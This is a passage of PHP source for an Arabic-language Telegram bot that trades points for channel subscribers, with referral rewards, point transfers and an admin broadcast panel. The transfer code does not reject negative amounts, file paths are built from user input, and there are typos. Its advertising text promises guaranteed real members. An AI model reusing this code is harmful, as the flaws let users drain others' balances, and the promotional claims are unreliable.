$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$sales["userfild"]["$fromid"]["getjoin"]="$username";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
}
else
{
bot('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"انتهت القنوات المضافة يمكنك الان
مشاركة رابطك مع صديق والحصول
على 5 نقاط 😃",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"تحديث القنوات 😇",'callback_data'=>'takecoin'],['text'=>"رجوع 🔙",'callback_data'=>'panel']],
[['text'=>"تجميع باستخدام الرابط 💎",'callback_data'=>'member']],
]
])
]);
}
}
}
if($data=="badchannel"){
$getjoinchannel = $sales["userfild"]["$fromid"]["getjoin"];
bot ('answercallbackquery', [
'callback_query_id'=>$membercall,
'text' => "تم تقديم طلب الحذف من البوت سيراجع مسؤل البوت الطلب, يرجى تقديم تبليغ عن القناة داخل التليكرام ليتم حذفها نهائيا 📛",
'show_alert' =>true
]);
bot ('sendmessage',[
'chat_id'=>592900473,
'text'=>"
- ابلاغ جديد عن قناة غير ملتزمة او انحرافية في البوت ، معرف القناة ؛ @$getjoinchannel !
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
• معلومات العضو الذي قام بالابلاغ عن القناة ؛ 👇🏿♥️ ؛
▫️ الايدي ؛ $fromid ،
◾️ المعرف ؛ @$usernames ،",
]);		
}
elseif($data=="accont"){
$invite = $sales["userfild"]["$fromid"]["invite"];
$coin = $sales["userfild"]["$fromid"]["coin"];
$setchannel = $sales["userfild"]["$fromid"]["setchannel"];
$setmember = $sales["userfild"]["$fromid"]["setmember"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"• جميع احصائيات النقاط الخاصةه بك ؛ 💛👇🏿 ' 

◾️ عدد النقاط ؛ $coin
▫️ اخر قناة قمت بتمويلها ؛ $setchannel
◾️ عدد الاعضاء الذي قمت بطلبهم للقناة ؛ $setmember
▫️ عدد الذين قامو باستخدام رابطك ؛ $invite
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎
• معلومات حسابك الشخصي ؛ 📌'

◾️ الاسم ؛ $firstname
▫️ المعرف ؛ @$usernames
◾️ الايدي ؛ $fromid",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"- القنوات التي تم الاشتراك فيها ، 📭 '",'callback_data'=>'mechannel']],
[['text'=>"- القنوات التي تم تمويلها من البوت ، ⚖ '",'callback_data'=>'order']],
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
]);	
}
elseif($data=="mechannel"){
$allchannel = $sales["userfild"]["$fromid"]["channeljoin"];
for($z = 0;$z <= count($allchannel)-1;$z++){
$result = $at.$result."📍 "."@".$allchannel[$z]."\n";
}
if($result == true){
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"- لستةه القنوات التي قمت بالاشتراك فيها ، 💛👇🏿؛
	
$result

• ملاحظة : عند مغادرتك قناة واحدة سوف يتم خصم 2 من نقاطك ' بسبب المغادرة ؛ لذلك وجب التنبيه ، 📂 '",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
]
])
]);		
}	
else
{
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"- انت لم تقم بالاشتراك في أي قناة من قنوات البوت ياعزيزي ؛ يرجى الاشتراك وتجميع النقاط ومن بعدها الضغط على زر القنوات التي تم الاشتراك فيها ، 🚸 .
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel'],['text'=>"جمع نقاط 💰",'callback_data'=>'takecoin']],
]
])
]);		
}
}
elseif($data=="order"){
$allchannel = $sales["userfild"]["$fromid"]["listorder"];
for($z = 0;$z <= count($allchannel)-1;$z++){
$result = $at.$result."📍 ".$allchannel[$z]."عضو"."\n";
}
if($result == true){
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"القنوات التي تم تمويلها من خلال البوت 😎
$result",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],]
])
]);		
}
else
{
$coin = $sales["userfild"]["$fromid"]["coin"];
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"- عذرا ياعزيزي انت لم تقم بتمويل أي قناة من قنواتك ؛ لانك لا تمتلك النقاط او تمتلك ولكنك لم تقم بالتمويل .. اذا كانت لديك نقاط كافية لشراء الاعضاء اضغط على الزر الموجود بالاسفل ، 🇮🇶 ' 
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel'],['text'=>"- شراء الاعضاء ، 💸 '",'callback_data'=>'takemember']],]
])
]);		
}
}
elseif($data=="member"){
$invite = $sales["userfild"]["$fromid"]["invite"];
$coin = $sales["userfild"]["$fromid"]["coin"];
bot ('sendMessage',[
'chat_id'=>$chatid,
'text'=>"- بوت زيادة الاعضاء للقنوات ، ⚖ !

- يمكنك جمع النقاط وزيادة اعضاء قناتك اعضاء حقيقيين من خلال البوت باليوم 500 عضو واكثر وكلشي مضمون ، 📻 !

- قم بالدخول الى البوت من خلال الرابط التالي لا تقم بتفويت هذه الفرصةه العظيمةه ، 👇🏿♥️ ؛
https://t.me/$botuser?start=$fromid",
]);
bot ('sendmessage',[
'chat_id'=>$chatid,
'text'=>"- قم بمشاركةه الرابط الذي في الاعلى واحصل على النقاط بكل سهولة ؛ دون الاشتراك في القنوات قم بارسال رابطك الى جميع المجموعات والقنوات واحصل على النقاط ، 🐬 !

• عدد النقاط الخاصةه بك ؛ $coin
• عدد الذين قامو بالدخول الى رابطك ؛ $invite",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
]
])
]);			
}
elseif($data=="sendcoin"){	

bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"- لارسال النقاط الى مستخدم اخر يجب ان يكون المستخدم مشترك في البوت وبعدها قم بارسال ايدي المستخدم لارسال النقاط اليه ، 📌 !
	
- او قم بأرسال توجيه رسالة من رسائل المستخدم الذي تريد ارسال النقاط اليه الى البوت ، 💬 '
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
]
])
]);	
$sales["userfild"]["$fromid"]["file"]="sendcoin";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);		
}
elseif ($KING["userfild"]["$from_id"]["file"] == 'sendcoin') {
$coin = $KING["userfild"]["$from_id"]["coin"];
if($forward_from == true){
if($forward_from_id != $from_id){
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"• تم العثور على المستخدم معلومات المستخدم ، 💚👇🏿؛

▫️ الاسم ؛ $forward_from_first_name
◾️ المعرف ؛ @$forward_from_username
▫️ الايدي ؛$forward_from_id

- الان قم بارسال العدد الذي تريد تحويله الى المستخدم ،
- عدد النقاط الخاصةه بك ؛ $coin ",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);
$KING["userfild"]["$from_id"]["file"]="setsendcoin";
$KING["userfild"]["$from_id"]["sendcoinid"]="$forward_from_id";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
}
else
{
bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"• لا يمكن ارسال نقاطك الى نفسك ياعزيزي ؛ ارسل ايدي المستخدم فقط ، 🌟 !",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);
}
}
else
{
if($text != $from_id){
if(is_numeric($text)){
$stat = file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=$text&user_id=".$text);
$statjson = json_decode($stat, true);
$status = $statjson['ok'];
if($status == 1){
$name = $statjson['result']['user']['first_name'];
$username = $statjson['result']['user']['username'];
$id = $statjson['result']['user']['id'];
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"• تم العثور على المستخدم معلومات المستخدم ، 💚👇🏿؛

▫️ الاسم ؛ $name
◾️ المعرف ؛ @$usrrname
▫️ الايدي ؛$id

- الان قم بارسال العدد الذي تريد تحويله الى المستخدم ،
- عدد النقاط الخاصةه بك ؛ $coin ",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);
$KING["userfild"]["$from_id"]["file"]="setsendcoin";
$KING["userfild"]["$from_id"]["sendcoinid"]="$text";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
}
else
{
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- الايدي الخاص بالمستخدم غير صحيح ، 🔱
- قم بالتاكد من الايدي وارسالة مرة اخرى الى البوت ، 🕊 !",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);
}
}
else
{
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"• ايدي العضو غير صحيح او المستخدم غير مشترك في البوت يرجى التاكد من الايدي او قم بالاشتراك في البوت ، 🔰؛
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);
}
}
else
{
	bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- لا يمكن الارسال لنفسك ؛ ⚠️
- قم بالارسال لصديق او لحسابك الثاني ، ☑️
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);	
}
}
}	
elseif($KING["userfild"]["$from_id"]["file"] == "setsendcoin"){
$coin = $KING["userfild"]["$from_id"]["coin"];
$userid = $KING["userfild"]["$from_id"]["sendcoinid"];
$inuser = json_decode(file_get_contents("data/$userid.json"),true);
$coinuser = $inuser["userfild"]["$userid"]["coin"];
if($text <= $coin && $coin > 0){
$coinplus = $coin - $text;
$sendcoinplus = $coinuser + $text;
	bot ('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"- تم ارسال النقاط الى المستخدم بنجاح ، ⚖ !
- المعلومات العامةه للعضو والنقاط ، 📌 ؛

▫️ ايدي العضو ؛ $userid
◾️ عدد النقاط التي تم ارسالها ؛ $text
▫️ عدد نقاطك الآن ؛ $coinplus",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],]
])
	]);	
		bot ('sendmessage',[
	'chat_id'=>$userid,
	'text'=>"- تم ارسال $text من النقاط اليك ، 🌟 !
- معلومات العضو الذي قام بأرسال النقاط اليك ، 🔱 ؛

◾️ ايدي العضو ؛ $from_id
▫️ المعرف ؛ @$username",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],]
])
	]);	
$KING["userfild"]["$from_id"]["file"]="none";
$KING["userfild"]["$from_id"]["coin"]="$coinplus";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
$inuser["userfild"]["$userid"]["coin"]="$sendcoinplus";
$inuser = json_encode($inuser,true);
file_put_contents("data/$userid.json",$inuser);	
}
else
{
	bot ('sendmessage',[
	'chat_id'=>$chat_id,
	'text'=>"- عدد النقاط الذي تود ارسالة اقل من عدد نقاطك ، 🐬 !
- اقصى عدد يمكنك ارساله ؛ $coin",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],]
])
	]);	
}
}

elseif($data=="takemember"){
$coin = $sales["userfild"]["$fromid"]["coin"];
if($coin >= 10){
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"الان قم بأرسال معرف القناة ؛ ⁉️ !
مثال ؛ @$channel ",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
			]);	
$sales["userfild"]["$fromid"]["file"]="setchannel";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);	
}
else
{
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"- يجب ان يكون العدد اكثر من 10 نقاط ،🇮🇶 '

- عدد النقاط الحالي ؛ $coin ",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel'],['text'=>"جمع نقاط 💰",'callback_data'=>'takecoin']],
 ]
])
			]);	
}
}
elseif ($KING["userfild"]["$from_id"]["file"] == 'setchannel') {
if(preg_match('/^(@)(.*)/s',$text)){
$coin = $KING["userfild"]["$from_id"]["coin"];
$max = $coin / 3;
$maxmember = floor($max);
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"قم بأرسال عدد الاعضاء الان ليتم لتمويل 😉
قناتك : $text 📥
نقاطك : ($coin)💰
أسعار النقاط كما يلي في الاسفل 😌🌸

20 = 6 عضو|💰|30 = 10 عضو
40 = 13 عضو|💰|50 = 16 عضو
60 = 20 عضو|💰|70 = 23 عضو
80 = 26 عضو|💰|90 = 30 عضو
100 = 33 عضو|💰|110 = 36 عضو
120 = 40 عضو|💰|130 = 43 عضو
140 = 46 عضو|💰|150 = 50 عضو

ملاحظة : سعر العضو الواحد بـ 3 نقاط
والمعادلة الرئيسية هية 3÷10 تقوم بـ
تقسيم عدد 3 مع عدد نقاطك للتأكد 😃",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);
$KING["userfild"]["$from_id"]["file"]="setmember";
$KING["userfild"]["$from_id"]["setchannel"]="$text";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
}
else
{
	bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"تأكد من معرف القناة الخاصة بك ⁉️
يجب ان يكون هكذا » @$channel ",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);
}
}
if ($KING["userfild"]["$from_id"]["file"] == 'setmember') {
$coin = $KING["userfild"]["$from_id"]["coin"];
$setchannel = $KING["userfild"]["$from_id"]["setchannel"];
$max = $coin / 3;
$maxmember = floor($max);
if($maxmember >= $text){
$howmember = getChatMembersCount($setchannel,$token);
$endmember = $howmember + $text;
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"• معلومات التمويل الحالي 💯

القناة المراد تمويلها : *$setchannel* ،
العدد المطلوب : *$text* ،
اعضاء القناة الحالي: *$howmember* ،
عدد الاعضاء بعد التمويل : *$endmember* ،

قم برفع البوت مشرف في القناة ليتم العمل بصورة صحيحة ؛ قم برفع البوت ثم اضغط على زر تأكيد الذي يوجد تحت",
'parse_mode'=>"MarkDown",
'disable_web_page_preview'=>true,
'reply_markup'=>json_encode([
'inline_keyboard'=>[
								[['text'=>"تأكيد وموافقة ♨️'",'callback_data'=>'trueorder']],
				[['text'=>"رجوع 🔙",'callback_data'=>'panel'],],
 ]
])
 ]);
$KING["userfild"]["$from_id"]["file"]="none";
$KING["userfild"]["$from_id"]["setmember"]="$text";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);
}
else
{
	bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"• العدد الذي قمت بطلبه اكثر من نقاطك 👤
• لذلك لم يتم استجابة طلبكك 🤞

تأكد من عدد نقودك وعدد الاعضاء الذي طلبتة",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);
}
}
if($data == "trueorder"){
$token = MY_KING;
$sales = json_decode(file_get_contents("data/$fromid.json"),true);
$setchannel = $sales["userfild"]["$fromid"]["setchannel"];
$admin = getChatstats($setchannel,$token);
if($admin !== true){
bot ('answercallbackquery', [
'callback_query_id' =>$membercall,
'text' => "أرفع البوت أدمن ليتم تمويلها بشكل آمن 🗣",
'show_alert' =>true
]);
}
else
{
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"• تم وضع قناتك ضمن قنوات التمويل Ⓜ️

يمكنك طلب الهدايا ايضا ؛ ملاحظة اذا قمت بمخالفة قوانين وقواعد وتعليمات البوت سوف نقوم بحذف قناتك تأكد من الذهاب الى المساعدة والقواعد لتجنب الحظر ،✅",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
]
])
]);	
$coin = $sales["userfild"]["$fromid"]["coin"];
$setchannel = $sales["userfild"]["$fromid"]["setchannel"];
$setmember = $sales["userfild"]["$fromid"]["setmember"];
$pluscoin = $setmember * 3;
$coinplus = $coin - $pluscoin;
$sales["userfild"]["$fromid"]["coin"]="$coinplus";
$sales["userfild"]["$fromid"]["listorder"][]="$setchannel -> $setmember";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
$user["channellist"][]="$setchannel";
$user["setmemberlist"][]="$setmember";
$user = json_encode($user,true);
file_put_contents("data/user.json",$user);
}
}

elseif($data=="sup"){
bot ('editmessagetext',[
'chat_id'=>$chatid,
 'message_id'=>$messageid,
'text'=>"- الدعم وحل المشاكل الموجودة بالبوت ؛

- الرجاء ارسال الشكاوي او المشاكل الموجودة بالبوت ليتم تصحيحها ارسل مشكلتك برسالة واحدة فضلا ؛ 🕊 !

- يمكنك ايضا ارسال الميديا ؛ الصور والملصقات والصوت وغيرها .. ",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
			]);	
$sales["userfild"]["$fromid"]["file"]="sendsup";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);	
}
elseif ($KING["userfild"]["$from_id"]["file"] == 'sendsup') {
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"• تم ارسال رسالتك الى مبرمج البوت ، 
• انتظر الاجابة من فضلك ، ",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);
bot ('ForwardMessage',[
'chat_id'=>$Dev[0],
'from_chat_id'=>$chat_id,
'message_id'=>$message_id
]);
}
	elseif($update->message && $update->message->reply_to_message && in_array($from_id,$Dev) && $tc == "private"){
	bot ('sendmessage',[
"chat_id"=>$chat_id,
"text"=>"- تم ارسال رسالتك الى العضو بنجاح ، 🎌 !
- بواسطه ؛ @$username !"
		]);
	bot ('sendmessage',[
"chat_id"=>$reply,
"text"=>"$text",
'parse_mode'=>'MarkDown'
		]);
}
if(file_get_contents("data/$fromid.txt") == "true"){
$pluscoin = file_get_contents("data/".$fromid."coin.txt");
$inviter = $sales["userfild"]["$fromid"]["inviter"];
$invitercoin = $pluscoin / 100 * 20;
	bot ('answercallbackquery', [
'callback_query_id' =>$membercall,
'text' => "📍 اضافة النقود التي تم شراءها ...",
'show_alert' =>false
]);
		 bot ('sendmessage',[
'chat_id'=>$inviter,
'text'=>"💰 العدد : $invitercoin !
			
📍 تمت العمليةه بنجاح !!",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']],
 ]
])
 ]);
$coin = $sales["userfild"]["$fromid"]["coin"];
$coinplus = $coin + $pluscoin;
$sales["userfild"]["$fromid"]["coin"]="$coinplus";
$sales = json_encode($sales,true);
file_put_contents("data/$fromid.json",$sales);
$inuser = json_decode(file_get_contents("data/$inviter.json"),true);
$coininviter = $inuser["userfild"]["$inviter"]["coin"];
$coinplusinviter = $coininviter + $invitercoin ;
$inuser["userfild"]["$inviter"]["coin"]="$coinplusinviter";;
$inuser = json_encode($inuser,true);
file_put_contents("data/$inviter.json",$inuser);
unlink("data/".$fromid."coin.txt");
unlink("data/$fromid.txt");
}
//panel admin
elseif($text=="/panel" or $text=="/admin" or $text=="ادمن"){
if ($tc == "private") {
if (in_array($from_id,$Dev)){
bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- اهلا بك عزيزي المطور ، 🧜‍♂ '
- قم باختيار ماتريد من القائمةه التي في الاسفل ، 👅 '
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
 'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode([
'keyboard'=>[
 [['text'=>"- عدد الاعضاء ، 👤 '"]],
[['text'=>"- رسالة للكل ، 🎒 '"],['text'=>"- توجيه للكل ، 🧜‍♂ '"]],
[['text'=>"- عرض القنوات ، 🔱 '"],['text'=>"- حذف قناة ، 📛 '"]],
[['text'=>"📍 نقاط للكل"],['text'=>"- ارسال نقاط ، 🕊 '"]],
[['text'=>"نسخه"]]
],
'resize_keyboard'=>true
])
 ]);
}
}
}
elseif($text=="رجوع 🔙"){
if ($tc == "private") {
if (in_array($from_id,$Dev)){
bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- اهلا بك عزيزي المطور ، 🧜‍♂ '
- قم باختيار ماتريد من القائمةه التي في الاسفل ، 👅 '
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
 'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>"- عدد الاعضاء ، 👤 '"]],
[['text'=>"- رسالة للكل ، 🎒 '"],['text'=>"- توجيه للكل ، 🧜‍♂ '"]],
[['text'=>"- عرض القنوات ، 🔱 '"],['text'=>"- حذف قناة ، 📛 '"]],
[['text'=>"📍 نقاط للكل"],['text'=>"- ارسال نقاط ، 🕊 '"]],
[['text'=>"نسخه"]]
],
'resize_keyboard'=>true
])
 ]);
$KING["userfild"]["$from_id"]["file"]="none";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);		
}
}
}
elseif($text=="- عدد الاعضاء ، 👤 '"){
if (in_array($from_id,$Dev)){
$all = count($user["userlist"]);
$order = count($user["channellist"]);
bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"• اهلا بك يا عزيزي المطور ؛ @username !

◾️ عدد الاعضاء ؛ $all ،
▫️ عدد القنوات بقائمةه التمويل ؛ $order .
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
'hide_keyboard'=>true,
		]);
		}
}

elseif ($text == "- رسالة للكل ، 🎒 '" ) {
if (in_array($from_id,$Dev)){
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- اهلا بك يا ؛ @$username !
- الان قم بارسال الرسالة ليتم ارسالها للكل ، 🇮🇶 '",
	'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
'keyboard'=>[
	[
	['text'=>"رجوع 🔙"] 
	]
],
'resize_keyboard'=>true
])
 ]);
$KING["userfild"]["$from_id"]["file"]="sendtoall";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
}
}
elseif ($KING["userfild"]["$from_id"]["file"] == 'sendtoall') {
$KING["userfild"]["$from_id"]["file"]="none";
$numbers = $user["userlist"];
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
if ($text != "رجوع 🔙") {
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- تم ارسال الرسالة الى جميع مشتركين البوت بنجاح بواسطة ؛ @$username ، 📢 !",
	'reply_to_message_id'=>$message_id,
 ]);
for($z = 0;$z <= count($numbers)-1;$z++){
 bot ('sendmessage',[
'chat_id'=>$numbers[$z],
		'text'=>"$text
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
]);
}
}
}
elseif ($text == "- توجيه للكل ، 🧜‍♂ '" ) {
if (in_array($from_id,$Dev)){
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- اهلا بك يا ؛ @$username !
- الان قم بارسال التوجيه ليتم ارسالة للكل ، 🇮🇶 '",
	'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
'keyboard'=>[
	[['text'=>"رجوع 🔙"] ]
],
'resize_keyboard'=>true
])
 ]);
$KING["userfild"]["$from_id"]["file"]="fortoall";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);		
}
}
elseif ($KING["userfild"]["$from_id"]["file"] == 'fortoall') {
$KING["userfild"]["$from_id"]["file"]="none";
$numbers = $user["userlist"];
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);		
if ($text != "رجوع 🔙") {
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- تم ارسال التوجيه الى جميع مشتركين البوت بنجاح بواسطة ؛ @$username ، 📢 !",
	'reply_to_message_id'=>$message_id,
 ]);
for($z = 0;$z <= count($numbers)-1;$z++){
Forward($numbers[$z], $chat_id,$message_id);
}
}
}
elseif($text=="- عرض القنوات ، 🔱 '"){
if (in_array($from_id,$Dev)){
$order = $user["channellist"];
$ordercount = count($user["channellist"]);
for($z = 0;$z <= count($order)-1;$z++){
$result = $result.$order[$z]."\n";
}
bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- اهلا بك ؛ @$username !! 
◾️ عدد القنوات التي تحت التمويل ؛ $ordercount
		▫️ لستةه معرفات القنوات التي تحت التمويل ؛ 📌
$result",
'hide_keyboard'=>true,
		]);
		}
}
elseif($text=="- حذف قناة ، 📛 '"){
if (in_array($from_id,$Dev)){
				bot ('sendmessage',[
		'chat_id'=>$chat_id,
		'text'=>"- حسنا ياعزيزي ؛ @$username !
- الان قم بارسال معرف القناة التي تود حذفها ، 🔘
﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎﹎",
'reply_markup'=>json_encode([
'keyboard'=>[
	[['text'=>"رجوع 🔙"] ]
],
'resize_keyboard'=>true
])
]);
$KING["userfild"]["$from_id"]["file"]="remorder";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);		
}
}
elseif ($KING["userfild"]["$from_id"]["file"] == 'remorder') {
if ($text != "رجوع 🔙") {
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"- تم حذف القناة من البوت بنجاح ، ⚠️
- بواسطة ؛ @$username ، !",
	'reply_to_message_id'=>$message_id,
 ]);
$how = array_search($text,$user["channellist"]);
unset($user["setmemberlist"][$how]);
unset($user["channellist"][$how]);
$user["channellist"]=array_values($user["channellist"]); 
$user["setmemberlist"]=array_values($user["setmemberlist"]);
$user = json_encode($user,true);
file_put_contents("data/user.json",$user);
$KING["userfild"]["$from_id"]["file"]="none";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);		
}
}
elseif($text=="- ارسال نقاط ، 🕊 '"){
if (in_array($from_id,$Dev)){
				bot ('sendmessage',[
		'chat_id'=>$chat_id,
		'text'=>"ارسل ايدي العضو الذي تريد الاىسال اليه او ارسل توجيه من العضو",
'reply_markup'=>json_encode([
'keyboard'=>[
	[
	['text'=>"رجوع 🔙"] 
	]
],
'resize_keyboard'=>true
])
		]);
$KING["userfild"]["$from_id"]["file"]="adminsendcoin";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
		}
}
elseif ($KING["userfild"]["$from_id"]["file"] == 'adminsendcoin') {
if ($text != "رجوع 🔙") {
if ($forward_from == true) {
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"حسنا عزيزي المطور

الايدي : $forward_from_id
المعرف : @$forward_from_username

دز عدد النقاط الان",
	'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
'keyboard'=>[
	[
	['text'=>"رجوع 🔙"] 
	]
],
'resize_keyboard'=>true
])
 ]);
$KING["idforsend"]="$forward_from_id";
$KING["userfild"]["$from_id"]["file"]="sethowsendcoin";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
}
else
{
	 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"ارسل العدد الذي تريد ارسالة الى صاحب الايدي : $text",
	'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
'keyboard'=>[
	[
	['text'=>"رجوع 🔙"] 
	]
],
'resize_keyboard'=>true
])
 ]);
$KING["idforsend"]="$text";
$KING["userfild"]["$from_id"]["file"]="sethowsendcoin";
$KING = json_encode($KING,true);
file_put_contents("data/$from_id.json",$KING);	
}
}
}
elseif ($KING["userfild"]["$from_id"]["file"] == 'sethowsendcoin') {
if ($text != "رجوع 🔙") {
$id = $KING["idforsend"];
 bot ('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"📍 العدد $text تم الارسال الى : $id بنجاح ^_^",
	'reply_to_message_id'=>$message_id,
 ]);
bot ('sendmessage',[
'chat_id'=>$id,
'text'=>"تم استلام » $text نقطة 💰
من أدآرة البوت حظا موفقآ 😀",
			'reply_markup'=>json_encode([
'inline_keyboard'=>[
				[['text'=>"رجوع 🔙",'callback_data'=>'panel']
],
 ]
])
 ]);
$inuser = json_decode(file_get_contents("data/$id.json"),true);
$coin = $inuser["userfild"]["$id"]["coin"];
$coinplus = $coin + $text;
$inuser["userfild"]["$id"]["coin"]="$coinplus";
$inuser = json_encode($inuser,true);
